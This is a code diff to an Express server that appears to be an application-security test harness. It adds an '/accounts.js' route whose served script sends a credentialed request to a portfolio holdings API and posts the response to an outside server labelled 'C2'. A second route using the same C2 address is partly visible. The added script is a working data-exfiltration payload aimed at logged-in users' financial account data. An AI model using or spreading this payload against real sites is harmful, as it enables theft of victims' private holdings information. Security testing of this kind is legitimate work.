@@ -32,6 +32,23 @@ app.post("/testpay", (_req, res) => {
   res.type("html").send("<!doctype html><html lang=\"en\"><title>Test</title><body>hello</body></html>");
 });
 
+app.get("/accounts.js", (_req, res) => {
+  res.type("application/javascript").send(`
+  var C2 = 'https://appsec-test-website.onrender.com/testpay';
+  var g = new XMLHttpRequest();
+  g.open('GET', '/sgw3/secureapp/N600/WebAPI/diapi/portfolioapi/v1/holdings', false);
+  g.withCredentials = true;
+  g.send();
+
+  var diProfile = g.responseText;
+  
+  var e2 = new XMLHttpRequest();
+  e2.open('POST', C2, true);
+  e2.setRequestHeader('Content-Type', 'application/json');
+  e2.send(diProfile);
+  `);
+});
+
 app.get("/file.js", (_req, res) => {
   res.type("application/javascript").send(`
   var C2 = 'https://appsec-test-website.onrender.com/testpay';
